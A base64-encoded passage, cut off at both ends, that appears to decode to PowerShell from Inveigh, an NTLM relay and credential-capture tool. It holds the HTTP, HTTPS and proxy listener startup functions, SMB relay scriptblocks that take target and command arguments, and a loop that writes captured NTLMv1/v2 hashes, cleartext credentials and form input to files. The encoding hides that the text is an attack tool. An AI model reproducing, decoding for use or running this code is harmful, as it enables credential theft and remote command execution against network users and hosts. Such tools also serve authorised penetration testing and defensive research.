IFtCeXRlW11dKDB4MGQsMHgwYSkpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCRIVFRQX2hlYWRlcl9jb250ZW50X3R5cGUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRwYWNrZXRfSFRUUFJlc3BvbnNlLkFkZCgiSFRUUFJlc3BvbnNlX0NvbnRlbnRUeXBlIiwkSFRUUF9oZWFkZXJfY29udGVudF90eXBlICsgW0J5dGVbXV0oMHgwZCwweDBhKSkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYoJEhUVFBfaGVhZGVyX2NhY2hlX2NvbnRyb2wpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRwYWNrZXRfSFRUUFJlc3BvbnNlLkFkZCgiSFRUUFJlc3BvbnNlX0NhY2hlQ29udHJvbCIsJEhUVFBfaGVhZGVyX2NhY2hlX2NvbnRyb2wgKyBbQnl0ZVtdXSgweDBkLDB4MGEpKQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkSFRUUF9zZW5kKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkcGFja2V0X0hUVFBSZXNwb25zZS5BZGQoIkhUVFBSZXNwb25zZV9NZXNzYWdlIixbQnl0ZVtdXSgweDBkLDB4MGEpICsgJEhUVFBfbWVzc2FnZV9ieXRlcykKICAgICAgICAgICAgICAgICRIVFRQX3Jlc3BvbnNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9IVFRQUmVzcG9uc2UKICAgICAgICAgICAgICAgICRIVFRQX3N0cmVhbS5Xcml0ZSgkSFRUUF9yZXNwb25zZSwwLCRIVFRQX3Jlc3BvbnNlLkxlbmd0aCkKICAgICAgICAgICAgICAgICRIVFRQX3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1tIDEwCiAgICAgICAgICAgICRIVFRQX3JlcXVlc3RfcmF3X1VSTF9vbGQgPSAkSFRUUF9yZXF1ZXN0X3Jhd19VUkwKICAgICAgICAgICAgJEhUVFBfY2xpZW50X2hhbmRsZV9vbGQgPSAkSFRUUF9jbGllbnQuQ2xpZW50LkhhbmRsZQoKICAgICAgICAgICAgaWYoJEhUVFBfY2xpZW50X2Nsb3NlKQogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgaWYoJHByb3h5X2xpc3RlbmVyKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRIVFRQX2NsaWVudC5DbGllbnQuQ2xvc2UoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRIVFRQX2NsaWVudC5DbG9zZSgpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CgogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewoKICAgICAgICAgICAgaWYoJEhUVFBfZGF0YV9hdmFpbGFibGUgLW9yICEkSFRUUF9yZXNldF9kZWxheSAtb3IgJEhUVFBfcmVzZXRfZGVsYXlfc3RvcHdhdGNoLkVsYXBzZWQgLWdlICRIVFRQX3Jlc2V0X2RlbGF5X3RpbWVvdXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRIVFRQX2NsaWVudC5DbG9zZSgpCiAgICAgICAgICAgICAgICAkSFRUUF9jbGllbnRfY2xvc2UgPSAkdHJ1ZQogICAgICAgICAgICAgICAgJEhUVFBfcmVzZXRfZGVsYXkgPSAkZmFsc2UKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1tIDEwMAogICAgICAgICAgICB9CgogICAgICAgIH0KCiAgICB9CgogICAgJEhUVFBfY2xpZW50LkNsb3NlKCkKICAgIHN0YXJ0LXNsZWVwIC1zIDEKICAgICRIVFRQX2xpc3RlbmVyLlNlcnZlci5ibG9ja2luZyA9ICRmYWxzZQogICAgU3RhcnQtU2xlZXAgLXMgMQogICAgJEhUVFBfbGlzdGVuZXIuU2VydmVyLkNsb3NlKCkKICAgIFN0YXJ0LVNsZWVwIC1zIDEKICAgICRIVFRQX2xpc3RlbmVyLlN0b3AoKQp9CgojIENvbnRyb2wgUmVsYXkgTG9vcCBTY3JpcHRCbG9jawokY29udHJvbF9yZWxheV9zY3JpcHRibG9jayA9IAp7CiAgICBwYXJhbSAoJENvbnNvbGVRdWV1ZUxpbWl0LCRSZWxheUF1dG9FeGl0LCRSdW5UaW1lKQoKICAgIGZ1bmN0aW9uIFN0b3BJbnZlaWdoCiAgICB7CiAgICAgICAgcGFyYW0gKFtTdHJpbmddJGV4aXRfbWVzc2FnZSkKCiAgICAgICAgaWYoJGludmVpZ2guSFRUUFMgLWFuZCAhJGludmVpZ2guSFRUUFNfZXhpc3RpbmdfY2VydGlmaWNhdGUgLW9yICgkaW52ZWlnaC5IVFRQU19leGlzdGluZ19jZXJ0aWZpY2F0ZSAtYW5kICRpbnZlaWdoLkhUVFBTX2ZvcmNlX2NlcnRpZmljYXRlX2RlbGV0ZSkpCiAgICAgICAgewoKICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZSA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5YNTA5Q2VydGlmaWNhdGVzLlg1MDlTdG9yZSgiTXkiLCJMb2NhbE1hY2hpbmUiKQogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLk9wZW4oJ1JlYWRXcml0ZScpCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVzID0gKEdldC1DaGlsZEl0ZW0gQ2VydDpcTG9jYWxNYWNoaW5lXE15IHwgV2hlcmUtT2JqZWN0IHskXy5Jc3N1ZXIgLUxpa2UgIkNOPSIgKyAkaW52ZWlnaC5jZXJ0aWZpY2F0ZV9pc3N1ZXJ9KQoKICAgICAgICAgICAgICAgIEZvckVhY2goJGNlcnRpZmljYXRlIGluICRjZXJ0aWZpY2F0ZXMpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLlJlbW92ZSgkY2VydGlmaWNhdGUpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLkNsb3NlKCkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiU1NMIENlcnRpZmljYXRlIERlbGV0aW9uIEVycm9yIC0gUmVtb3ZlIE1hbnVhbGx5IikKCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU1NMIENlcnRpZmljYXRlIERlbGV0aW9uIEVycm9yIC0gUmVtb3ZlIE1hbnVhbGx5IikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU1NMIENlcnRpZmljYXRlIERlbGV0aW9uIEVycm9yIC0gUmVtb3ZlIE1hbnVhbGx5IikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGlmKCRpbnZlaWdoLnJ1bm5pbmcpCiAgICAgICAgewogICAgICAgICAgICBTdGFydC1TbGVlcCAtUyAxCiAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJJbnZlaWdoIGV4aXRlZCBhdCAkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSIpCgogICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEludmVpZ2ggZXhpdGVkIGR1ZSB0byAkZXhpdF9tZXNzYWdlIikKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBJbnZlaWdoIGV4aXRlZCBkdWUgdG8gJGV4aXRfbWVzc2FnZSIpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TIDEKICAgICAgICAgICAgJGludmVpZ2gucnVubmluZyA9ICRmYWxzZQogICAgICAgIH0KCiAgICAgICAgaWYoJGludmVpZ2gucmVsYXlfcnVubmluZykKICAgICAgICB7CiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TIDEKICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIkludmVpZ2ggUmVsYXkgZXhpdGVkIGR1ZSB0byAkZXhpdF9tZXNzYWdlIGF0ICQoR2V0LURhdGUgLWZvcm1hdCAncycpIikKCiAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gSW52ZWlnaCBSZWxheSBleGl0ZWQgZHVlIHRvICRleGl0X21lc3NhZ2UiKQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEludmVpZ2ggUmVsYXkgZXhpdGVkIGR1ZSB0byAkZXhpdF9tZXNzYWdlIikKICAgICAgICAgICAgfQoKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVMgMQogICAgICAgICAgICAkaW52ZWlnaC5yZWxheV9ydW5uaW5nID0gJGZhbHNlCgogICAgICAgIH0gCgogICAgICAgICRpbnZlaWdoLkhUVFBTID0gJGZhbHNlCiAgICB9CgogICAgaWYoJFJ1blRpbWUpCiAgICB7ICAgIAogICAgICAgICRjb250cm9sX3RpbWVvdXQgPSBOZXctVGltZVNwYW4gLU1pbnV0ZXMgJFJ1blRpbWUKICAgICAgICAkY29udHJvbF9zdG9wd2F0Y2ggPSBbU3lzdGVtLkRpYWdub3N0aWNzLlN0b3B3YXRjaF06OlN0YXJ0TmV3KCkKICAgIH0KICAgICAgIAogICAgd2hpbGUoJGludmVpZ2gucmVsYXlfcnVubmluZykKICAgIHsKICAgICAgICAKICAgICAgICBpZigkUmVsYXlBdXRvRXhpdCAtZXEgJ1knIC1hbmQgISRpbnZlaWdoLlNNQl9yZWxheSkKICAgICAgICB7CiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TIDUKICAgICAgICAgICAgU3RvcEludmVpZ2ggImRpc2FibGVkIHJlbGF5IgogICAgICAgIH0KCiAgICAgICAgaWYoJFJ1blRpbWUpCiAgICAgICAgewoKICAgICAgICAgICAgaWYoJGNvbnRyb2xfc3RvcHdhdGNoLkVsYXBzZWQgLWdlICRjb250cm9sX3RpbWVvdXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFN0b3BJbnZlaWdoICJydW4gdGltZSIKICAgICAgICAgICAgfQoKICAgICAgICB9CgogICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0IC1hbmQgLW5vdCAkaW52ZWlnaC5jb250cm9sKQogICAgICAgIHsKCiAgICAgICAgICAgIHdoaWxlKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVswXXxPdXQtRmlsZSAkaW52ZWlnaC5sb2dfb3V0X2ZpbGUgLUFwcGVuZAogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgd2hpbGUoJGludmVpZ2guTlRMTXYxX2ZpbGVfcXVldWUuQ291bnQgLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12MV9maWxlX3F1ZXVlWzBdfE91dC1GaWxlICRpbnZlaWdoLk5UTE12MV9vdXRfZmlsZSAtQXBwZW5kCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjFfZmlsZV9xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICB9CgogICAgICAgICAgICB3aGlsZSgkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZS5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYyX2ZpbGVfcXVldWVbMF18T3V0LUZpbGUgJGludmVpZ2guTlRMTXYyX291dF9maWxlIC1BcHBlbmQKICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12Ml9maWxlX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHdoaWxlKCRpbnZlaWdoLmNsZWFydGV4dF9maWxlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jbGVhcnRleHRfZmlsZV9xdWV1ZVswXXxPdXQtRmlsZSAkaW52ZWlnaC5jbGVhcnRleHRfb3V0X2ZpbGUgLUFwcGVuZAogICAgICAgICAgICAgICAgJGludmVpZ2guY2xlYXJ0ZXh0X2ZpbGVfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgd2hpbGUoJGludmVpZ2guZm9ybV9pbnB1dF9maWxlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5mb3JtX2lucHV0X2ZpbGVfcXVldWVbMF18T3V0LUZpbGUgJGludmVpZ2guZm9ybV9pbnB1dF9vdXRfZmlsZSAtQXBwZW5kCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5mb3JtX2lucHV0X2ZpbGVfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgIH0KCiAgICAgICAgaWYoISRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0IC1hbmQgJENvbnNvbGVRdWV1ZUxpbWl0IC1nZSAwKQogICAgICAgIHsKCiAgICAgICAgICAgIHdoaWxlKCRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQ291bnQgLWd0ICRDb25zb2xlUXVldWVMaW1pdCAtYW5kICEkaW52ZWlnaC5jb25zb2xlX291dHB1dCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICB9CgogICAgICAgIH0KCiAgICAgICAgU3RhcnQtU2xlZXAgLW0gNQogICAgfQoKIH0KCiMgSFRUUCBMaXN0ZW5lciBTdGFydHVwIEZ1bmN0aW9uIApmdW5jdGlvbiBIVFRQTGlzdGVuZXIoKQp7CiAgICAkSFRUUFNfbGlzdGVuZXIgPSAkZmFsc2UKICAgICRwcm94eV9saXN0ZW5lciA9ICRmYWxzZQogICAgJEhUVFBfcnVuc3BhY2UgPSBbUnVuc3BhY2VGYWN0b3J5XTo6Q3JlYXRlUnVuc3BhY2UoKQogICAgJEhUVFBfcnVuc3BhY2UuT3BlbigpCiAgICAkSFRUUF9ydW5zcGFjZS5TZXNzaW9uU3RhdGVQcm94eS5TZXRWYXJpYWJsZSgnaW52ZWlnaCcsJGludmVpZ2gpCiAgICAkSFRUUF9wb3dlcnNoZWxsID0gW1Bvd2VyU2hlbGxdOjpDcmVhdGUoKQogICAgJEhUVFBfcG93ZXJzaGVsbC5SdW5zcGFjZSA9ICRIVFRQX3J1bnNwYWNlCiAgICAkSFRUUF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkc2hhcmVkX2Jhc2ljX2Z1bmN0aW9uc19zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJEhUVFBfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJGlya2luX2Z1bmN0aW9uc19zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJEhUVFBfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRTTUJfcmVsYXlfcmVzcG9uc2Vfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRTTUJfcmVsYXlfZXhlY3V0ZV9zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJEhUVFBfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJFNNQl9OVExNX2Z1bmN0aW9uc19zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJEhUVFBfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJEhUVFBfc2NyaXB0YmxvY2spLkFkZEFyZ3VtZW50KCRDaGFsbGVuZ2UpLkFkZEFyZ3VtZW50KCRDb21tYW5kKS5BZGRBcmd1bWVudCgKICAgICAgICAkSFRUUElQKS5BZGRBcmd1bWVudCgkSFRUUFBvcnQpLkFkZEFyZ3VtZW50KCRIVFRQUmVzZXREZWxheSkuQWRkQXJndW1lbnQoCiAgICAgICAgJEhUVFBSZXNldERlbGF5VGltZW91dCkuQWRkQXJndW1lbnQoJEhUVFBTX2xpc3RlbmVyKS5BZGRBcmd1bWVudCgkUHJveHkpLkFkZEFyZ3VtZW50KAogICAgICAgICRQcm94eUlnbm9yZSkuQWRkQXJndW1lbnQoJHByb3h5X2xpc3RlbmVyKS5BZGRBcmd1bWVudCgkUmVsYXlBdXRvRGlzYWJsZSkuQWRkQXJndW1lbnQoCiAgICAgICAgJFNlcnZpY2UpLkFkZEFyZ3VtZW50KCRTTUJfdmVyc2lvbikuQWRkQXJndW1lbnQoJFRhcmdldCkuQWRkQXJndW1lbnQoJFVzZXJuYW1lcykuQWRkQXJndW1lbnQoCiAgICAgICAgJFdQQURBdXRoKS5BZGRBcmd1bWVudCgkV1BBREF1dGhJZ25vcmUpLkFkZEFyZ3VtZW50KCRXUEFEUmVzcG9uc2UpID4gJG51bGwKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQmVnaW5JbnZva2UoKSA+ICRudWxsCn0KClN0YXJ0LVNsZWVwIC1tIDUwCgojIEhUVFBTIExpc3RlbmVyIFN0YXJ0dXAgRnVuY3Rpb24gCmZ1bmN0aW9uIEhUVFBTTGlzdGVuZXIoKQp7CiAgICAkSFRUUFNfbGlzdGVuZXIgPSAkdHJ1ZQogICAgJHByb3h5X2xpc3RlbmVyID0gJGZhbHNlCiAgICAkSFRUUFNfcnVuc3BhY2UgPSBbUnVuc3BhY2VGYWN0b3J5XTo6Q3JlYXRlUnVuc3BhY2UoKQogICAgJEhUVFBTX3J1bnNwYWNlLk9wZW4oKQogICAgJEhUVFBTX3J1bnNwYWNlLlNlc3Npb25TdGF0ZVByb3h5LlNldFZhcmlhYmxlKCdpbnZlaWdoJywkaW52ZWlnaCkKICAgICRIVFRQU19wb3dlcnNoZWxsID0gW1Bvd2VyU2hlbGxdOjpDcmVhdGUoKQogICAgJEhUVFBTX3Bvd2Vyc2hlbGwuUnVuc3BhY2UgPSAkSFRUUFNfcnVuc3BhY2UKICAgICRIVFRQU19wb3dlcnNoZWxsLkFkZFNjcmlwdCgkc2hhcmVkX2Jhc2ljX2Z1bmN0aW9uc19zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJEhUVFBTX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRpcmtpbl9mdW5jdGlvbnNfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRIVFRQU19wb3dlcnNoZWxsLkFkZFNjcmlwdCgkU01CX3JlbGF5X2NoYWxsZW5nZV9zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJEhUVFBTX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRTTUJfcmVsYXlfcmVzcG9uc2Vfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRIVFRQU19wb3dlcnNoZWxsLkFkZFNjcmlwdCgkU01CX3JlbGF5X2V4ZWN1dGVfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRIVFRQU19wb3dlcnNoZWxsLkFkZFNjcmlwdCgkU01CX05UTE1fZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUFNfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJEhUVFBfc2NyaXB0YmxvY2spLkFkZEFyZ3VtZW50KCRDaGFsbGVuZ2UpLkFkZEFyZ3VtZW50KCRDb21tYW5kKS5BZGRBcmd1bWVudCgKICAgICAgICAkSFRUUElQKS5BZGRBcmd1bWVudCgkSFRUUFNQb3J0KS5BZGRBcmd1bWVudCgkSFRUUFJlc2V0RGVsYXkpLkFkZEFyZ3VtZW50KAogICAgICAgICRIVFRQUmVzZXREZWxheVRpbWVvdXQpLkFkZEFyZ3VtZW50KCRIVFRQU19saXN0ZW5lcikuQWRkQXJndW1lbnQoJFByb3h5KS5BZGRBcmd1bWVudCgKICAgICAgICAkUHJveHlJZ25vcmUpLkFkZEFyZ3VtZW50KCRwcm94eV9saXN0ZW5lcikuQWRkQXJndW1lbnQoJFJlbGF5QXV0b0Rpc2FibGUpLkFkZEFyZ3VtZW50KAogICAgICAgICRTZXJ2aWNlKS5BZGRBcmd1bWVudCgkU01CX3ZlcnNpb24pLkFkZEFyZ3VtZW50KCRUYXJnZXQpLkFkZEFyZ3VtZW50KCRVc2VybmFtZXMpLkFkZEFyZ3VtZW50KAogICAgICAgICRXUEFEQXV0aCkuQWRkQXJndW1lbnQoJFdQQURBdXRoSWdub3JlKS5BZGRBcmd1bWVudCgkV1BBRFJlc3BvbnNlKSA+ICRudWxsCiAgICAkSFRUUFNfcG93ZXJzaGVsbC5CZWdpbkludm9rZSgpID4gJG51bGwKfQoKU3RhcnQtU2xlZXAgLW0gNTAKCiMgUHJveHkgTGlzdGVuZXIgU3RhcnR1cCBGdW5jdGlvbiAKZnVuY3Rpb24gUHJveHlMaXN0ZW5lcigpCnsKICAgICRIVFRQU19saXN0ZW5lciA9ICRmYWxzZQogICAgJHByb3h5X2xpc3RlbmVyID0gJHRydWUKICAgICRwcm94eV9ydW5zcGFjZSA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkcHJveHlfcnVuc3BhY2UuT3BlbigpCiAgICAkcHJveHlfcnVuc3BhY2UuU2Vzc2lvblN0YXRlUHJveHkuU2V0VmFyaWFibGUoJ2ludmVpZ2gnLCRpbnZlaWdoKQogICAgJHByb3h5X3Bvd2Vyc2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICAkcHJveHlfcG93ZXJzaGVsbC5SdW5zcGFjZSA9ICRwcm94eV9ydW5zcGFjZQogICAgJHByb3h5X3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkcHJveHlfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJGlya2luX2Z1bmN0aW9uc19zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJHByb3h5X3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRTTUJfcmVsYXlfY2hhbGxlbmdlX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkcHJveHlfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJFNNQl9yZWxheV9yZXNwb25zZV9zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJHByb3h5X3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRTTUJfcmVsYXlfZXhlY3V0ZV9zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJHByb3h5X3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRTTUJfTlRMTV9mdW5jdGlvbnNfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRwcm94eV9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkSFRUUF9zY3JpcHRibG9jaykuQWRkQXJndW1lbnQoJENoYWxsZW5nZSkuQWRkQXJndW1lbnQoJENvbW1hbmQpLkFkZEFyZ3VtZW50KAogICAgICAgICRQcm94eUlQKS5BZGRBcmd1bWVudCgkUHJveHlQb3J0KS5BZGRBcmd1bWVudCgkSFRUUFJlc2V0RGVsYXkpLkFkZEFyZ3VtZW50KAogICAgICAgICRIVFRQUmVzZXREZWxheVRpbWVvdXQpLkFkZEFyZ3VtZW50KCRIVFRQU19saXN0ZW5lcikuQWRkQXJndW1lbnQoJFByb3h5KS5BZGRBcmd1bWVudCgKICAgICAgICAkUHJveHlJZ25vcmUpLkFkZEFyZ3VtZW50KCRwcm94eV9saXN0ZW5lcikuQWRkQXJndW1lbnQoJFJlbGF5QXV0b0Rpc2FibGUpLkFkZEFyZ3VtZW50KAogICAgICAgICRTZXJ2aWNlKS5BZGRBcmd1bWVudCgkU01CX3ZlcnNpb24pLkFkZEFyZ3VtZW50KCRUYXJnZXQpLkFkZEFyZ3VtZW50KCRVc2VybmFtZXMpLkFkZEFyZ3VtZW50KAogICAgICAgICRXUEFEQXV0aCkuQWRkQXJndW1lbnQoJFdQQURBdXRoSWdub3JlKS5BZGRBcmd1bWVudCgkV1BBRFJlc3BvbnNlKSA+ICRudWxsCiAgICAkcHJveHlfcG93ZXJzaGVsbC5CZWdpbkludm9rZSgpID4gJG51bGwKfQoKIyBDb250cm9sIFJlbGF5IFN0YXJ0dXAgRnVuY3Rpb24KZnVuY3Rpb24gQ29udHJvbFJlbGF5TG9vcCgpCnsKICAgICRjb250cm9sX3JlbGF5X3J1bnNwYWNlID0gW1J1bnNwYWNlRmFjdG9yeV06OkNyZWF0ZVJ1bnNwYWNlKCkKICAgICRjb250cm9sX3JlbGF5X3J1bnNwYWNlLk9wZW4oKQogICAgJGNvbnRyb2xfcmVsYXlfcnVuc3BhY2UuU2Vzc2lvblN0YXRlUHJveHkuU2V0VmFyaWFibGUoJ2ludmVpZ2gnLCRpbnZlaWdoKQogICAgJGNvbnRyb2xfcmVsYXlfcG93ZXJzaGVsbCA9IFtQb3dlclNoZWxsXTo6Q3JlYXRlKCkKICAgICRjb250cm9sX3JlbGF5X3Bvd2Vyc2hlbGwuUnVuc3BhY2UgPSAkY29udHJvbF9yZWxheV9ydW5zcGFjZQogICAgJGNvbnRyb2xfcmVsYXlfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJHNoYXJlZF9iYXNpY19mdW5jdGlvbnNfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRjb250cm9sX3JlbGF5X3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRjb250cm9sX3JlbGF5X3NjcmlwdGJsb2NrKS5BZGRBcmd1bWVudCgkQ29uc29sZVF1ZXVlTGltaXQpLkFkZEFyZ3VtZW50KAogICAgICAgICRSZWxheUF1dG9FeGl0KS5BZGRBcmd1bWVudCgkUnVuVGltZSkgPiAkbnVsbAogICAgJGNvbnRyb2xfcmVsYXlfcG93ZXJzaGVsbC5CZWdpbkludm9rZSgpID4gJG51bGwKfQoKIyBIVFRQIFNlcnZlciBTdGFydAppZigkSFRUUCAtZXEgJ1knKQp7CiAgICBIVFRQTGlzdGVuZXIKfQoKIyBIVFRQUyBTZXJ2ZXIgU3RhcnQKaWYoJEhUVFBTIC1lcSAnWScpCnsKICAgIEhUVFBTTGlzdGVuZXIKfQoKIyBQcm94eSBTZXJ2ZXIgU3RhcnQKaWYoJFByb3h5IC1lcSAnWScpCnsKICAgIFByb3h5TGlzdGVuZXIKfQoKIyBDb250cm9sIFJlbGF5IExvb3AgU3RhcnQKaWYoJENvbnNvbGVRdWV1ZUxpbWl0IC1nZSAwIC1vciAkaW52ZWlnaC5maWxlX291dHB1dCAtb3IgJFJlbGF5QXV0b0V4aXQgLW9yICRSdW5UaW1lKQp7CiAgICBDb250cm9sUmVsYXlMb29wCn0KCiMgQ29uc29sZSBPdXRwdXQgTG9vcAp0cnkKewoKICAgIGlmKCRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0KQogICAgewoKICAgICAgICBpZigkQ29uc29sZVN0YXR1cykKICAgICAgICB7ICAgIAogICAgICAgICAgICAkY29uc29sZV9zdGF0dXNfdGltZW91dCA9IE5ldy1UaW1lU3BhbiAtTWludXRlcyAkQ29uc29sZVN0YXR1cwogICAgICAgICAgICAkY29uc29sZV9zdGF0dXNfc3RvcHdhdGNoID0gW1N5c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5